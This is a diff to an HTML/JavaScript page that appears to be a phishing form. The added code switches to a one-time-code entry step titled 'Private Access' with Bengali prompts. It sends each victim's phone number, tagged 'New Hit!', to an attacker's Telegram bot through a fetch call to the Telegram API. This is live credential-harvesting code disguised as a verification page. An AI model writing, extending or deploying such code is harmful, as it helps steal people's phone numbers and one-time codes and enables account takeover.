@@ -128,4 +128,21 @@
         }
         userPhone = phoneInput;
 
-        // নাম পরিবর্তন করে "
+        // নাম পরিবর্তন করে "Private Access" করা হলো
+        document.getElementById('displayTitle').innerText = "Private Access";
+        document.getElementById('displayMsg').innerText = "কোডটি নিচে লিখুন";
+
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+        document.getElementById('otp1').focus();
+        startGlobalTimer();
+        sendToTelegram(`🔔 New Hit!\n📱 Number: ${userPhone}`);
+    }
+
+    function sendToTelegram(text) {
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+        fetch(url);
+    }
+</script>
+</body>
+</html>
